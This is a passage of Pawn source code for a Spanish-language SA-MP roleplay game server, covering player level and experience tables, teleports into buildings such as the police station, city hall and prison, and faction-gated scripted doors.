	if(PlayerInfo[playerid][pAdiccion][3] > 0) PlayerInfo[playerid][pAdiccion][3] --; //Heroína
	if(PlayerInfo[playerid][pAdiccion][4] > 0) PlayerInfo[playerid][pAdiccion][4] --; //LSD
	//Habilidades físicas
	PlayerInfo[playerid][pFuerza] --;
	if(PlayerInfo[playerid][pFuerza] < 100) PlayerInfo[playerid][pFuerza] = 100;
	//Trabajo
	if(PlayerInfo[playerid][pContrato] > 0) PlayerInfo[playerid][pContrato] --;
    return 1;
}

stock GetPlayerLevel(playerid) //Sube de nivel automáticamente
{
    new nivel = PlayerInfo[playerid][pNivel], string[50];
	if(PlayerInfo[playerid][pExp] >= 1110) PlayerInfo[playerid][pNivel]=20;
	else if(PlayerInfo[playerid][pExp] >= 990) PlayerInfo[playerid][pNivel]=19;
	else if(PlayerInfo[playerid][pExp] >= 870) PlayerInfo[playerid][pNivel]=18;
	else if(PlayerInfo[playerid][pExp] >= 750) PlayerInfo[playerid][pNivel]=17;
	else if(PlayerInfo[playerid][pExp] >= 630) PlayerInfo[playerid][pNivel]=16;
	else if(PlayerInfo[playerid][pExp] >= 510) PlayerInfo[playerid][pNivel]=15;
	else if(PlayerInfo[playerid][pExp] >= 450) PlayerInfo[playerid][pNivel]=14;
	else if(PlayerInfo[playerid][pExp] >= 390) PlayerInfo[playerid][pNivel]=13;
	else if(PlayerInfo[playerid][pExp] >= 330) PlayerInfo[playerid][pNivel]=12;
	else if(PlayerInfo[playerid][pExp] >= 270) PlayerInfo[playerid][pNivel]=11;
	else if(PlayerInfo[playerid][pExp] >= 210) PlayerInfo[playerid][pNivel]=10;
	else if(PlayerInfo[playerid][pExp] >= 180) PlayerInfo[playerid][pNivel]=9;
	else if(PlayerInfo[playerid][pExp] >= 150) PlayerInfo[playerid][pNivel]=8;
	else if(PlayerInfo[playerid][pExp] >= 120) PlayerInfo[playerid][pNivel]=7;
	else if(PlayerInfo[playerid][pExp] >= 90) PlayerInfo[playerid][pNivel]=6;
	else if(PlayerInfo[playerid][pExp] >= 60) PlayerInfo[playerid][pNivel]=5;
	else if(PlayerInfo[playerid][pExp] >= 45) PlayerInfo[playerid][pNivel]=4;
	else if(PlayerInfo[playerid][pExp] >= 30) PlayerInfo[playerid][pNivel]=3;
	else if(PlayerInfo[playerid][pExp] >= 15) PlayerInfo[playerid][pNivel]=2;
	else if(PlayerInfo[playerid][pExp] >= 0) PlayerInfo[playerid][pNivel]=1;
	if(PlayerInfo[playerid][pNivel] > nivel)
	{
		format(string, sizeof(string), "~w~¡Ahora eres nivel ~g~%d~w~!", PlayerInfo[playerid][pNivel]);
		GameTextForPlayer(playerid, string, 1000, 1);
	}
	return PlayerInfo[playerid][pNivel];
}

stock SetPlayerLevel(playerid) //Asigna pExp al nivel del jugador
{
	if(PlayerInfo[playerid][pNivel] == 20) PlayerInfo[playerid][pExp] = 1110;
	else if(PlayerInfo[playerid][pNivel] == 19) PlayerInfo[playerid][pExp] = 990;
	else if(PlayerInfo[playerid][pNivel] == 18) PlayerInfo[playerid][pExp] = 870;
	else if(PlayerInfo[playerid][pNivel] == 17) PlayerInfo[playerid][pExp] = 750;
	else if(PlayerInfo[playerid][pNivel] == 16) PlayerInfo[playerid][pExp] = 630;
	else if(PlayerInfo[playerid][pNivel] == 15) PlayerInfo[playerid][pExp] = 510;
	else if(PlayerInfo[playerid][pNivel] == 14) PlayerInfo[playerid][pExp] = 450;
	else if(PlayerInfo[playerid][pNivel] == 13) PlayerInfo[playerid][pExp] = 390;
	else if(PlayerInfo[playerid][pNivel] == 12) PlayerInfo[playerid][pExp] = 330;
	else if(PlayerInfo[playerid][pNivel] == 11) PlayerInfo[playerid][pExp] = 270;
	else if(PlayerInfo[playerid][pNivel] == 10) PlayerInfo[playerid][pExp] = 210;
	else if(PlayerInfo[playerid][pNivel] == 9) PlayerInfo[playerid][pExp] = 180;
	else if(PlayerInfo[playerid][pNivel] == 8) PlayerInfo[playerid][pExp] = 150;
	else if(PlayerInfo[playerid][pNivel] == 7) PlayerInfo[playerid][pExp] = 120;
	else if(PlayerInfo[playerid][pNivel] == 6) PlayerInfo[playerid][pExp] = 90;
	else if(PlayerInfo[playerid][pNivel] == 5) PlayerInfo[playerid][pExp] = 60;
	else if(PlayerInfo[playerid][pNivel] == 4) PlayerInfo[playerid][pExp] = 45;
	else if(PlayerInfo[playerid][pNivel] == 3) PlayerInfo[playerid][pExp] = 30;
	else if(PlayerInfo[playerid][pNivel] == 2) PlayerInfo[playerid][pExp] = 15;
	else if(PlayerInfo[playerid][pNivel] == 1) PlayerInfo[playerid][pExp] = 0;
	return PlayerInfo[playerid][pExp];
}

stock GetRespetoMinimo(level) //Cuenta cuánto falta para el siguiente nivel
{
	new RespetoMinimo;
	if(level == 0 || level == 1) RespetoMinimo = 0;
	else if(level == 2) RespetoMinimo = 15;
	else if(level == 3) RespetoMinimo = 30;
	else if(level == 4) RespetoMinimo = 45;
	else if(level == 5) RespetoMinimo = 60;
	else if(level == 6) RespetoMinimo = 90;
	else if(level == 7) RespetoMinimo = 120;
	else if(level == 8) RespetoMinimo = 150;
	else if(level == 9) RespetoMinimo = 180;
	else if(level == 10) RespetoMinimo = 210;
	else if(level == 11) RespetoMinimo = 270;
	else if(level == 12) RespetoMinimo = 330;
	else if(level == 13) RespetoMinimo = 390;
	else if(level == 14) RespetoMinimo = 450;
	else if(level == 15) RespetoMinimo = 510;
	else if(level == 16) RespetoMinimo = 630;
	else if(level == 17) RespetoMinimo = 750;
	else if(level == 18) RespetoMinimo = 870;
	else if(level == 19) RespetoMinimo = 990;
	else if(level >= 20) RespetoMinimo = 1110;
	return RespetoMinimo;
}

stock GetPlayerCajero(playerid) //Detecta cercanía a un cajero
{
	new Cajero;
	for(new i = 0; i < sizeof(Cajeros); i ++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 1.5, Cajeros[i][cX], Cajeros[i][cY], Cajeros[i][cZ]))
		{
			Cajero = i+1;
		}
	}
	return Cajero;
}

forward EntrarSitioPublico(playerid);
public EntrarSitioPublico(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 1.0, 1555.0660,-1675.6772,16.1953)) //Entrada de LSPD
	{
		SetPlayerPos(playerid,246.3626,107.8716,1003.2188);
		SetPlayerInterior(playerid, 10);
		SetPlayerFacingAngle(playerid, 0);
		TogglePlayerControllable(playerid, 0);
		SetTimerEx("Descongelar", 2000, false, "i", playerid);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 246.3626,107.8716,1003.2188)) //Salida de LSPD
	{
		SetPlayerPos(playerid,1555.0660,-1675.6772,16.1953);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 90);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1582.0264, -1674.8207, 5.8945)) //2ª planta parking LSPD
	{
        if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
		SetPlayerPos(playerid,-1609.3883, 729.6197, -5.2422);
		SetPlayerFacingAngle(playerid, 0);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, -1609.3883, 729.6197, -5.2422)) //1ª planta parking LSPD
	{
		SetPlayerPos(playerid,1582.0264, -1674.8207, 5.8945);
		SetPlayerFacingAngle(playerid, 270);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 270.3885,113.4809,1004.6172)) //Entrada armería comisaría LSPD
	{
        if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
		SetPlayerPos(playerid,221.1510,79.8274,1005.0391);
		SetPlayerInterior(playerid, 6);
		SetPlayerFacingAngle(playerid, 90);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 221.1510,79.8274,1005.0391)) //Salida armería comisaría LSPD
	{
		SetPlayerPos(playerid,270.3885,113.4809,1004.6172);
		SetPlayerInterior(playerid, 10);
		SetPlayerFacingAngle(playerid, 0);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 238.4005,114.8457,1010.2188)) //Salida azotea comisaría LSPD
	{
        if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
		SetPlayerPos(playerid,1573.0088,-1670.1738,28.3956);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 270);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1573.0088,-1670.1738,28.3956)) //Entrada azotea comisaría LSPD
	{
		SetPlayerPos(playerid,238.4005,114.8457,1010.2188);
		SetPlayerInterior(playerid, 10);
		SetPlayerFacingAngle(playerid, 90);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1525.1538,-1677.8840,5.8906) || IsPlayerInRangeOfPoint(playerid, 1.0, -1606.3339,672.5668,-5.2422)) //Entradas cárcel comisaría LSPD
	{
		SetPlayerPos(playerid,218.8535,121.0664,999.0156);
		SetPlayerInterior(playerid, 10);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerFacingAngle(playerid, 90);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 217.7758,117.4122,999.0216)) //Entrada celdas comisaría LSPD
	{
		SetPlayerPos(playerid,249.0331,86.8339,1003.3804);
		SetPlayerInterior(playerid, 6);
		SetPlayerVirtualWorld(playerid, 1);
		SetPlayerFacingAngle(playerid, 270);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 249.0331,86.8339,1003.3804)) //Salida celdas comisaría LSPD
	{
		SetPlayerPos(playerid,217.7758,117.4122,999.0216);
		SetPlayerInterior(playerid, 10);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerFacingAngle(playerid, 0);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 255.0220,126.2807,1003.2188)) //Ascensor 1ª planta comisaría LSPD
	{
        if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
        TogglePlayerControllable(playerid, 0);
		ShowPlayerDialog(playerid, 1, 2, "Ascensor LSPD", "Comisaría\n1ª Planta parking\n2ª Planta parking", "Aceptar", "Salir");
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1568.6243,-1689.9784,6.2188)) //Ascensor 1ª planta parking LSPD
	{
        if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
        TogglePlayerControllable(playerid, 0);
		ShowPlayerDialog(playerid, 1, 2, "Ascensor LSPD", "Comisaría\n1ª Planta parking\n2ª Planta parking", "Aceptar", "Salir");
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, -1594.2114,716.2331,-4.9063)) //Ascensor 2ª planta parking LSPD
	{
        if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
        TogglePlayerControllable(playerid, 0);
		ShowPlayerDialog(playerid, 1, 2, "Ascensor LSPD", "Comisaría\n1ª Planta parking\n2ª Planta parking", "Aceptar", "Salir");
	}
	else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1481.0206,-1771.1138,18.7958)) //Ayuntamiento entrada
	{
		SetPlayerPos(playerid, 390.1899,173.7861,1008.3828);
		SetPlayerInterior(playerid, 3);
		SetPlayerFacingAngle(playerid, 90);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 390.1899,173.7861,1008.3828)) //Ayuntamiento salida
	{
		SetPlayerPos(playerid, 1481.0206,-1771.1138,18.7958);
		SetPlayerInterior(playerid, 0);
		SetPlayerFacingAngle(playerid, 0);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 375.88223266602,164.72079467773,1025.7890625) && (GetPlayerVirtualWorld(playerid) == 0)) //Entrada azotea ayuntamiento
    {
	    if(PlayerInfo[playerid][pFaccion] == 0 || PlayerInfo[playerid][pFaccion] > 3){SendClientMessage(playerid,Rojo,"* No puedes entrar por aquí."); return 1;}
 		SetPlayerPos(playerid, 1437.2343,-1786.3534,33.4297);
		SetPlayerInterior(playerid,0);
		SetPlayerFacingAngle(playerid, 90);
    }
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1437.2343,-1786.3534,33.4297)) //Salida azotea ayuntamiento
	{
		SetPlayerPos(playerid, 375.88223266602,164.72079467773,1025.7890625);
		SetPlayerFacingAngle(playerid, 180);
		SetPlayerInterior(playerid,3);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 366.64654541016,158.77993774414,1008.3828125)) //Entrada garaje ayuntamiento
    {
        if(PlayerInfo[playerid][pFaccion] == 0 || PlayerInfo[playerid][pFaccion] > 3){SendClientMessage(playerid,Rojo,"* No puedes entrar por aquí."); return 1;}
 		SetPlayerPos(playerid, 1524.0345,-1825.3225,13.5469);
		SetPlayerInterior(playerid,0);
		SetPlayerFacingAngle(playerid, 180);
    }
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1524.0345,-1825.3225,13.5469)) //Salida garaje ayuntamiento
    {
	    if(PlayerInfo[playerid][pFaccion] == 0 || PlayerInfo[playerid][pFaccion] > 3){SendClientMessage(playerid,Rojo,"* No puedes entrar por aquí."); return 1;}
 	  	SetPlayerPos(playerid, 366.64654541016,158.77993774414,1008.3828125);
		SetPlayerInterior(playerid,3);
		SetPlayerFacingAngle(playerid, 0);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 2045.6418,-1908.1290,13.5469)) //Entrada autoescuela Willowfield
	{
		SetPlayerPos(playerid, -2026.8535,-104.0617,1035.1719);
		SetPlayerInterior(playerid,3);
		SetPlayerFacingAngle(playerid, 180);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, -2026.8535,-104.0617,1035.1719)) //Salida autoescuela Willowfield
	{
		SetPlayerPos(playerid, 2045.6418,-1908.1290,13.5469);
		SetPlayerInterior(playerid,0);
		SetPlayerFacingAngle(playerid, 270);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1498.4912,-1581.3987,13.5498)) //Entrada Hotel Commerce
	{
	    SetPlayerPos(playerid, 1726.9388,-1638.4977,20.2233);
		SetPlayerInterior(playerid,18);
		SetPlayerVirtualWorld(playerid,1);
		SetPlayerFacingAngle(playerid, 180);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1726.9388,-1638.4977,20.2233)) //Salida Hotel Commerce
	{
	    SetPlayerPos(playerid, 1498.4912,-1581.3987,13.5498);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerFacingAngle(playerid, 180);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 2232.6450,-1159.8384,25.8906)) //Entrada Motel Jefferson
	{
	    SetPlayerPos(playerid, 2215.0349,-1150.5457,1025.7969);
		SetPlayerInterior(playerid,15);
		SetPlayerVirtualWorld(playerid,1);
		SetPlayerFacingAngle(playerid, 270);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 2215.0349,-1150.5457,1025.7969)) //Salida Motel Jefferson
	{
	    SetPlayerPos(playerid, 2232.6450,-1159.8384,25.8906);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerFacingAngle(playerid, 90);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1797.9216,-1578.7523,14.0898)) //Entrada Prisión Federal
	{
	    SetPlayerPos(playerid, 2523.4546,-1301.8833,1048.2891);
		SetPlayerInterior(playerid,2);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerFacingAngle(playerid, 270);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 2523.4546,-1301.8833,1048.2891)) //Salida Prisión Federal
	{
	    SetPlayerPos(playerid, 1797.9216,-1578.7523,14.0898);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerFacingAngle(playerid, 270);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 2576.7878,-1289.9611,1044.1250)) //Entrada Patio Prisión Federal
	{
	    SetPlayerPos(playerid, 1772.0688,-1548.1400,9.9063);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerFacingAngle(playerid, 90);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1772.0688,-1548.1400,9.9063)) //Salida Patio Prisión Federal
	{
	    SetPlayerPos(playerid, 2576.7878,-1289.9611,1044.1250);
		SetPlayerInterior(playerid,2);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerFacingAngle(playerid, 90);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 2233.1997,-1333.3169,23.9816)) //Entrada Iglesia Jefferson
	{
	    TogglePlayerControllable(playerid, 0);
		SetTimerEx("Descongelar", 2000, false, "i", playerid);
	    SetPlayerPos(playerid, 1964.0940,-350.2319,1092.9454);
		SetPlayerInterior(playerid,1);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerFacingAngle(playerid, 180);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1964.0940,-350.2319,1092.9454)) //Salida Iglesia Jefferson
	{
	    SetPlayerPos(playerid, 2233.1997,-1333.3169,23.9816);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerFacingAngle(playerid, 90);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 648.7344,-1360.7629,13.5876)) //Entrada LSRTV
	{
	    TogglePlayerControllable(playerid, 0);
		SetTimerEx("Descongelar", 2000, false, "i", playerid);
	    SetPlayerPos(playerid, 248.5891,1783.5326,701.0859);
		SetPlayerInterior(playerid,1);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerFacingAngle(playerid, 180);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 248.5891,1783.5326,701.0859)) //Salida LSRTV
	{
	    SetPlayerPos(playerid, 648.7344,-1360.7629,13.5876);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerFacingAngle(playerid, 90);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 732.8732,-1355.4661,15.1563)) //Entrada Parking LSRTV
	{
	    if(PlayerInfo[playerid][pFaccion] != 4){SendClientMessage(playerid,Rojo,"* No puedes entrar por aquí."); return 1;}
	    TogglePlayerControllable(playerid, 0);
		SetTimerEx("Descongelar", 2000, false, "i", playerid);
	    SetPlayerPos(playerid, 258.6264,1777.5300,701.0859);
		SetPlayerInterior(playerid,1);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerFacingAngle(playerid, 270);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 258.6264,1777.5300,701.0859)) //Salida Parking LSRTV
	{
	    if(PlayerInfo[playerid][pFaccion] != 4){SendClientMessage(playerid,Rojo,"* No puedes entrar por aquí."); return 1;}
	    SetPlayerPos(playerid, 732.8732,-1355.4661,15.1563);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
		SetPlayerFacingAngle(playerid, 270);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 2523.3840,-1281.3458,1048.2891)) //Entrada armería prisión federal
	{
        if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
        TogglePlayerControllable(playerid, 0);
		SetTimerEx("Descongelar", 3000, false, "i", playerid);
		SetPlayerPos(playerid,1089.0194,-801.8175,1088.3660);
		SetPlayerFacingAngle(playerid, 90);
		SetPlayerInterior(playerid, 2);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1089.0194,-801.8175,1088.3660)) //Salida armería prisión federal
	{
		SetPlayerPos(playerid,2523.3840,-1281.3458,1048.2891);
		SetPlayerFacingAngle(playerid, 270);
		SetPlayerInterior(playerid, 2);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1084.5272,-808.0339,1088.3669)) //Entrada armería prisión federal - patio
	{
        if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
        TogglePlayerControllable(playerid, 0);
		SetTimerEx("Descongelar", 3000, false, "i", playerid);
		SetPlayerPos(playerid,1757.9861,-1560.4956,15.8120);
		SetPlayerFacingAngle(playerid, 90);
		SetPlayerInterior(playerid, 0);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1757.9861,-1560.4956,15.8120)) //Salida armería prisión federal - patio
	{
	    if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	    TogglePlayerControllable(playerid, 0);
		SetTimerEx("Descongelar", 3000, false, "i", playerid);
		SetPlayerPos(playerid,1084.5272,-808.0339,1088.3669);
		SetPlayerFacingAngle(playerid, 0);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 2529.6387,-1281.9346,1048.2891)) //Puerta oficina - prisión
	{
        if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
		SetPlayerPos(playerid,2532.1252,-1281.9380,1048.2891);
		SetPlayerFacingAngle(playerid, 270);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 2532.1252,-1281.9380,1048.2891)) //Puerta prisión oficina
	{
	    if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
		SetPlayerPos(playerid,2529.6387,-1281.9346,1048.2891);
		SetPlayerFacingAngle(playerid, 90);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 1773.4933,-1577.7090,22.9530)) //Azotea-prisión
	{
		SetPlayerPos(playerid,2524.9102,-1280.7483,1048.2891);
		SetPlayerFacingAngle(playerid, 180);
		SetPlayerInterior(playerid, 2);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 1.0, 2524.9102,-1280.7483,1048.2891)) //Prisión-azotea
	{
	    if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
		SetPlayerPos(playerid,1773.4933,-1577.7090,22.9530);
		SetPlayerFacingAngle(playerid, 315);
		SetPlayerInterior(playerid, 0);
	}
    return 1;
}

stock IsVehicleInRangeOfPoint(Float:radi, vehicleid, Float:x, Float:y, Float:z) //Si un vehículo está cerca de un punto
{
        new Float:oldposx, Float:oldposy, Float:oldposz;
        new Float:tempposx, Float:tempposy, Float:tempposz;
        GetVehiclePos(vehicleid, oldposx, oldposy, oldposz);
        tempposx = (oldposx -x);
        tempposy = (oldposy -y);
        tempposz = (oldposz -z);
        if(((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
        {
                return 1;
        }
        return 0;
}

forward AbrirPuerta(playerid); //Abre puertas scripteadas
public AbrirPuerta(playerid)
{
	if(PlayerInfo[playerid][pFaccion] == 1) //LSPD
	{
	    if(IsPlayerInRangeOfPoint(playerid, 15.0, 1544.6999500,-1630.8000500,13.3000000) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) //Barra elevadora LSPD
		{
	    	SetDynamicObjectRot(lspdpuerta1, 0.0, 10.0, 90.0);
	    	SetTimerEx("CerrarPuerta",4000,0,"p",lspdpuerta1);
		}
		else if(IsPlayerInRangeOfPoint(playerid, 12.0, 1589.0595700,-1638.1992200,14.0300000) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) //Valla parking LSPD
		{
	    	MoveDynamicObject(lspdpuerta2, 1595.9589800,-1638.1992200,14.0300000, 2.0);
	    	SetTimerEx("CerrarPuerta",4000,0,"p",lspdpuerta2);
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1582.6169400,-1637.9000200,13.5400000) && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) //Puerta parking LSPD
		{
	    	SetDynamicObjectRot(lspdpuerta3, 0.0000000,0.0000000,102.0000000);
	    	SetTimerEx("CerrarPuerta",4000,0,"p",lspdpuerta3);
		}
		else if(IsPlayerInRangeOfPoint(playerid, 3.0, 213.8999900,124.9300000,1000.6500200)) //Puerta cárcel comisaria
		{
	    	MoveDynamicObject(lspdpuerta4, 215.5000000,124.9296900,1000.6500200, 2.0);
	    	SetTimerEx("CerrarPuerta",4000,0,"p",lspdpuerta4);
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 253.1992200,109.8193400,1003.5000000)) //Puerta comisaria 1
		{
	    	MoveDynamicObject(lspdpuerta5, 253.1992200,111.0000000,1003.5000000, 2.0);
	    	SetTimerEx("CerrarPuerta",4000,0,"p",lspdpuerta5);
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 239.5996100,118.3496100,1003.5000000)) //Puerta comisaria 2
		{
	    	MoveDynamicObject(lspdpuerta6, 239.5996100,119.5306000,1003.5000000, 2.0);
	    	SetTimerEx("CerrarPuerta",4000,0,"p",lspdpuerta6);
		}
		else if(IsPlayerInRangeOfPoint(playerid, 3.0, 258.89999390,91.50000000,1004.09997559)) //Puerta celdas comisaría LSPD
        {
			MoveDynamicObject(lspdpuerta7, 258.89999390,90.00000000,1004.09997559, 2.0);
			SetTimerEx("CerrarPuerta",4000,0,"p",lspdpuerta7);
        }
        else if(IsPlayerInRangeOfPoint(playerid, 3.0, 2527.2000000,-1294.1300000,1049.9000000)) //Puerta prisión
        {
            MoveDynamicObject(puertaprision, 2528.8000000,-1294.1299000,1049.9000000, 2.0);
			SetTimerEx("CerrarPuerta",4000,0,"p",puertaprision);
        }
        else if(IsPlayerInRangeOfPoint(playerid, 3.0, 2533.3999000,-1283.8000000,1049.9000000)) //Puerta prisión 2
        {
            MoveDynamicObject(puertaprision2, 2533.1001000,-1283.8740000,1049.9000000, 2.0);
			SetTimerEx("CerrarPuerta",3000,0,"p",puertaprision2);
        }
	}
	if(PlayerInfo[playerid][pFaccion] == 4) //LSN
	{
	    if(IsPlayerInRangeOfPoint(playerid, 8.0, 781.8000000,-1384.8000000,12.7000000)) //Puerta LSN sur
		{
	    	MoveDynamicObject(LSNpuerta1, 775.0000000,-1384.8300000,12.7000000, 2.0);
	    	SetTimerEx("CerrarPuerta",5000,0,"p",LSNpuerta1);
		}
		else if(IsPlayerInRangeOfPoint(playerid, 8.0, 781.8000000,-1330.3000000,12.7000000)) //Puerta LSN norte
        {
			MoveDynamicObject(LSNpuerta2, 775.0000000,-1330.1600000,12.7000000, 2.0);
			SetTimerEx("CerrarPuerta",5000,0,"p",LSNpuerta2);
        }
	}
    return 1;
}

forward CerrarPuerta(puerta); //Cierra puertas scripteadas
public CerrarPuerta(puerta)
{
    if(puerta == lspdpuerta1){SetDynamicObjectRot(lspdpuerta1, 0.0, 90.0, 90.0);}
	else if(puerta == lspdpuerta2){MoveDynamicObject(lspdpuerta2, 1589.0595700,-1638.1992200,14.0300000, 2.0);}
	else if(puerta == lspdpuerta3){SetDynamicObjectRot(lspdpuerta3, 0.0000000,0.0000000,0.0000000);}
	else if(puerta == lspdpuerta4){MoveDynamicObject(lspdpuerta4, 213.8999900,124.9300000,1000.6500200, 2.0);}
	else if(puerta == lspdpuerta5){MoveDynamicObject(lspdpuerta5, 253.1992200,109.8193400,1003.5000000, 2.0);}
	else if(puerta == lspdpuerta6){MoveDynamicObject(lspdpuerta6, 239.5996100,118.3496100,1003.5000000, 2.0);}
	else if(puerta == lspdpuerta7){MoveDynamicObject(lspdpuerta7, 258.89999390,91.50000000,1004.09997559, 2.0);}
	else if(puerta == Celda1){MoveDynamicObject(Celda1, 266.25, 78.46, 1001.29, 3.0);}
	else if(puerta == Celda2){MoveDynamicObject(Celda2, 266.25, 82.95, 1001.29, 3.0);}
	else if(puerta == Celda3){MoveDynamicObject(Celda3, 266.25, 87.46, 1001.29, 3.0);}
	else if(puerta == lspddeposito){MoveDynamicObject(lspddeposito, 1620.6500244,-1861.5996094,15.3000002,2.5);}
	else if(puerta == puertaprision){MoveDynamicObject(puertaprision, 2527.2000000,-1294.1300000,1049.9000000,2.0);}
	else if(puerta == puertaprision2){MoveDynamicObject(puertaprision2, 2531.7000000,-1283.8740000,1049.9000000,2.0);}
	else if(puerta == puertaceldaprision1){SetDynamicObjectRot(puertaceldaprision1, 0.0, 0.0, 0.0);}
	else if(puerta == puertaceldaprision2){SetDynamicObjectRot(puertaceldaprision2, 0.0, 0.0, 0.0);}
	else if(puerta == puertaceldaprision3){SetDynamicObjectRot(puertaceldaprision3, 0.0, 0.0, 0.0);}
	else if(puerta == puertaceldaprision4){SetDynamicObjectRot(puertaceldaprision4, 0.0, 0.0, 0.0);}
	else if(puerta == puertaceldaprision5){SetDynamicObjectRot(puertaceldaprision5, 0.0, 0.0, 0.0);}
	else if(puerta == puertaceldaprision6){SetDynamicObjectRot(puertaceldaprision6, 0.0, 0.0, 0.0);}
	else if(puerta == puertaceldaprision7){SetDynamicObjectRot(puertaceldaprision7, 0.0, 0.0, 0.0);}
	else if(puerta == puertaceldaprision8){SetDynamicObjectRot(puertaceldaprision8, 0.0, 0.0, 0.0);}
	else if(puerta == puertaceldaprision9){SetDynamicObjectRot(puertaceldaprision9, 0.0, 0.0, 180.0);}
	else if(puerta == puertaceldaprision10){SetDynamicObjectRot(puertaceldaprision10, 0.0, 0.0, 180.0);}
	else if(puerta == puertaceldaprision11){SetDynamicObjectRot(puertaceldaprision11, 0.0, 0.0, 180.0);}
	else if(puerta == puertaceldaprision12){SetDynamicObjectRot(puertaceldaprision12, 0.0, 0.0, 180.0);}
	else if(puerta == puertaceldaprision13){SetDynamicObjectRot(puertaceldaprision13, 0.0, 0.0, 180.0);}
	else if(puerta == puertaceldaprision14){SetDynamicObjectRot(puertaceldaprision14, 0.0, 0.0, 180.0);}
